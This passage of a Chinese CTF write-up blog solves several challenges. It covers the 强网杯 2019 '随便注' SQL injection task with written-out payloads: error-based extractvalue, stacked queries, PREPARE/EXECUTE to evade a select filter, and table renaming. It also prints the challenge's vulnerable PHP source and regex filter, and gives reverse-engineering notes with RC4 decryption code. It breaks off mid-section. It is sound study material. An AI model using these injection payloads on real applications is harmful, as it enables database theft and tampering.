class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ia[] = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> ja[] = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>&#125;;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;ecstatic&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] ecs1 =<span class="keyword">new</span> <span class="keyword">byte</span>[fis.available()];</span><br><span class="line">        fis.read(ecs1);</span><br><span class="line">        fis.close();</span><br><span class="line">        fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;ecstatic2&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] ecs2 =<span class="keyword">new</span> <span class="keyword">byte</span>[fis.available()];</span><br><span class="line">        fis.read(ecs2);</span><br><span class="line">        fis.close();</span><br><span class="line">        FileOutputStream fos;</span><br><span class="line">        <span class="keyword">byte</span>[] tmp1 = <span class="keyword">new</span> <span class="keyword">byte</span>[ecs1.length];</span><br><span class="line">        <span class="keyword">byte</span>[] tmp2 = <span class="keyword">new</span> <span class="keyword">byte</span>[ecs2.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cnt=<span class="number">0</span>;cnt&lt;ia.length;cnt++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;<span class="number">7</span>;k++) &#123;</span><br><span class="line">                String key = getPassword(ia[cnt],ja[cnt],k);</span><br><span class="line">                System.out.println(key);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    tmp1 = decrypt(key,ecs1);</span><br><span class="line">                    tmp2 = decrypt(key,ecs2);</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Decryption Failed&quot;</span>);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;dec/&quot;</span>+ia[cnt]+<span class="string">&quot;&quot;</span>+ja[cnt]+<span class="string">&quot;&quot;</span>+k+<span class="string">&quot;_1.bmp&quot;</span>);</span><br><span class="line">                fos.write(tmp1);</span><br><span class="line">                fos.close();</span><br><span class="line">                fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;dec/&quot;</span>+ia[cnt]+<span class="string">&quot;&quot;</span>+ja[cnt]+<span class="string">&quot;&quot;</span>+k+<span class="string">&quot;_2.bmp&quot;</span>);</span><br><span class="line">                fos.write(tmp2);</span><br><span class="line">                fos.close();</span><br><span class="line">                System.out.println(<span class="string">&quot;[*] Decryption Success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后得到两张图片，分别是带flag图像的两帧</p>
<h2 id="web-强网杯-2019-随便注"><a href="#web-强网杯-2019-随便注" class="headerlink" title="[web][强网杯 2019]随便注"></a>[web][强网杯 2019]随便注</h2><p>今天时间不太够，先做一道web充数，改天补上</p>
<p>SQL注入问题，首先尝试是否存在注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1 <span class="comment">#</span></span><br><span class="line">1&#x27; and 1=2 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>第二行没有输出，说明存在注入</p>
<p>尝试获取列数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1 <span class="comment">#</span></span><br><span class="line">1&#x27; order by 2 <span class="comment">#</span></span><br><span class="line">1&#x27; order by 3 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>最后一个报错，说明只有两列</p>
<p>尝试获取数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>发现有过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure>
<p>尝试报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户名</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,user(),0x7e))); <span class="comment">#</span></span><br><span class="line">数据库</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,database(),0x7e))); <span class="comment">#</span></span><br><span class="line">版本</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,version(),0x7e))); <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>extractvalue(),updatexml()都是报错注入常用函数</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>extractvalue()</td>
<td>使用XPath表示法从xml字符串中提取值</td>
</tr>
<tr>
<td>updatexml</td>
<td>返回替换的xml片段</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<ol>
<li>extractvalue函数<br>extractvalue(xml_flag,xpath_expr)<br>extractvalue(‘<a><b></b></a>‘,’/a/b’)<br>就是寻找当前文档下a节点下的b节点，如果书写错误，就会报错，从而提供一些信息<br>select extractvalue(‘\<a\\\>\<b\><b></b>‘,concat(‘~’,(database())));</b\></a\\\></li>
<li>updatexml函数<br>updatexml(xml_target,xpath_expr,new_xml)<br>当xpath语法错误时，就会报错，含有错误信息<br>updatexml(‘test’,concat(‘~’,(database())),’test’)</li>
</ol>
</blockquote>
<p>使用堆叠注入绕过过滤，堆叠注入即一次执行多个命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; <span class="keyword">show</span> <span class="keyword">tables</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>多个命令使用分号隔开，这里第一个语句成功的话会增加很多输出，所以可以让前一个语句失败</p>
<p>查看表的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;desc `1919810931114514` <span class="comment">#</span></span><br><span class="line">-1&#x27;;desc `words` <span class="comment">#</span></span><br><span class="line">也可以如下</span><br><span class="line">-1&#x27;;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `words` #</span></span><br></pre></td></tr></table></figure>
<p>表名加反引号</p>
<blockquote>
<p>sql中desc用于查看表的详细信息<br>desc也是asc的反义词，排列时候有用</p>
</blockquote>
<p>接下来要读取字段内的数据，应该执行的语句如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br></pre></td></tr></table></figure>
<p>由于select过滤，所以需要采用预编译机制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set用于设置变量名和值</span><br><span class="line">prepare预备一个语句，赋予名称，引用该语句</span><br><span class="line">execute执行语句</span><br><span class="line">deallocate prepare释放预处理的语句</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect*from `1919810931114514`;&#x27;</span>);<span class="keyword">prepare</span> stmt <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt; <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>set @sql设置了名为sql的变量值为后面的语句拼合，然后prepare预备语句，执行语句</p>
<p>结果又是过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr($inject, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>但是不区分大小写，转化为大写</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect*from `1919810931114514`;&#x27;</span>);<span class="keyword">PREPARE</span> stmt <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt; <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>还可以修改表名和列名从而得到flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改表名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words</span><br><span class="line">修改列名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">30</span>);</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>然后1’ or 1=1#</p>
<p>= =这种方法有风险，万一不能一气呵成就挂了</p>
<p>每次启动靶机flag不同= =</p>
<p>源码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;easy_sql&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;</span><br><span class="line">&lt;!-- sqlmap是没有灵魂的 --&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    姿势: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;inject&quot;</span> value=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params">$inject</span>) </span>&#123;</span><br><span class="line">    preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,$inject) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params">$inject</span>) </span>&#123;</span><br><span class="line">    strstr($inject, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr($inject, <span class="string">&quot;prepare&quot;</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;inject&#x27;</span>])) &#123;</span><br><span class="line">    $id = $_GET[<span class="string">&#x27;inject&#x27;</span>];</span><br><span class="line">    waf1($id);</span><br><span class="line">    waf2($id);</span><br><span class="line">    $mysqli = <span class="keyword">new</span> mysqli(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;supersqli&quot;</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    $sql = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    $res = $mysqli-&gt;multi_query($sql);</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($rs = $mysqli-&gt;store_result())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> ($mysqli-&gt;more_results())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>($mysqli-&gt;next_result()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error &quot;</span>.$mysqli-&gt;errno.<span class="string">&quot; : &quot;</span>.$mysqli-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();  <span class="comment">//关闭数据库连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>大佬说这里执行多条sql语句会导致安全问题</p>
<p>这里应该就是堆叠注入的源头了</p>
<p>参考资料</p>
<p>[1] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html">https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html</a></p>
<p>[2] 2019强网杯”随便注”学习 - saucerman的文章 - 知乎<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/78989602">https://zhuanlan.zhihu.com/p/78989602</a></p>
<h2 id="rev-2019红帽杯-calc"><a href="#rev-2019红帽杯-calc" class="headerlink" title="[rev][2019红帽杯]calc"></a>[rev][2019红帽杯]calc</h2><ol>
<li>IDA打开，C++，看到输入函数，但是下面太乱，推测有自定义的结构体</li>
<li>在cin那里下断点，读入的结构体很奇怪，进入读入结构体的函数，发现了真正的cin函数，其参数应该是一个st::string结构，长度小于16采用栈存储，大于16采用堆存储，这不重要</li>
<li>下面就可以分析出自定义的结构体</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">InputStru</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span>* start; <span class="comment">// 存储数据的起始地址</span></span><br><span class="line">    <span class="keyword">int</span>* end; <span class="comment">// 当前存储的最后一个元素</span></span><br><span class="line">    <span class="keyword">int</span>* maxEnd; <span class="comment">//最大容量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ol>
<li>专用函数分析</li>
<li>140001700 moveInputStru arg2-&gt;arg1</li>
<li>1400017E0 subAbsInputStru 两数相减的绝对值</li>
<li>140001A90 相乘，a1=a2*a3</li>
<li>140003CE0 mallocMultiLen 乘法时分配空间用的</li>
<li>140001FF0 看起来像乘方调试出来也是乘方 a1=a2**a3</li>
<li>140001550 相加 a1=a2+a3</li>
<li>看答案是三个数的立方和等于42</li>
<li>最终的表达式分为两部分</li>
</ol>
<script type="math/tex; mode=display">
a=(x+y)^3-3x^2y-3xy^2\\
b=(z+4)^3-48z-12z^2\\
最后判断a==b</script><h2 id="rev-GKCTF2020-DbgIsFun"><a href="#rev-GKCTF2020-DbgIsFun" class="headerlink" title="[rev][GKCTF2020]DbgIsFun"></a>[rev][GKCTF2020]DbgIsFun</h2><p>调试后发现真正的比较函数，是rc4解密，但是解密之后发现不对</p>
<p>盲猜开头是flag，所以测试前4个字符和flag串的关系，发现是-128然后异或73，得到flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//初始化函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//加解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> key[<span class="number">5</span>];</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">71</span>;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">75</span>;</span><br><span class="line">    key[<span class="number">2</span>] = <span class="number">67</span>;</span><br><span class="line">    key[<span class="number">3</span>] = <span class="number">84</span>;</span><br><span class="line">    key[<span class="number">4</span>] = <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> sbox[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> data[] = &#123;<span class="number">0x2d</span>, <span class="number">0xd4</span>, <span class="number">0xf</span>, <span class="number">0xd0</span>, <span class="number">0x54</span>, <span class="number">0xee</span>, <span class="number">0x75</span>, <span class="number">0xd0</span>, <span class="number">0xe0</span>, <span class="number">0x30</span>, <span class="number">0x96</span>, <span class="number">0xe1</span>, <span class="number">0x79</span>, <span class="number">0x8a</span>, <span class="number">0xe0</span>, <span class="number">0xfe</span>, <span class="number">0x18</span>, <span class="number">0x3a</span>, <span class="number">0x27</span>, <span class="number">0xe7</span>, <span class="number">0x2f</span>, <span class="number">0x86</span>, <span class="number">0xc9</span>, <span class="number">0xfe</span>, <span class="number">0x66</span>, <span class="number">0x43</span>, <span class="number">0xa7</span>, <span class="number">0x75</span>&#125;;</span><br><span class="line">    rc4_init(sbox,key,<span class="keyword">sizeof</span>(key));</span><br><span class="line">    rc4_crypt(sbox,data,<span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="keyword">char</span> f[] = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(data);i++)&#123;</span><br><span class="line">        data[i]-=<span class="number">128</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,data[i]^f[i%<span class="number">4</span>]);</span><br><span class="line">        data[i]^=<span class="number">73</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,data,<span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><del>看答案发现动调和非动调情况下比对数据完全不同，应该是哪里做了手jio</del></p>
<p>就在上面，我瞎了</p>
<h2 id="rev-Crackme6"><a href="#rev-Crackme6" class="headerlink" title="[rev]Crackme6"></a>[rev]Crackme6</h2><ol>
<li>先检查pediy2016</li>
<li>长度为0x14</li>
<li>写反汇编jio本</li>
<li>先是一些常量计算</li>
<li>接下来三个 水仙花数</li>
<li>接下来是一个二元一次方程，解得1223</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 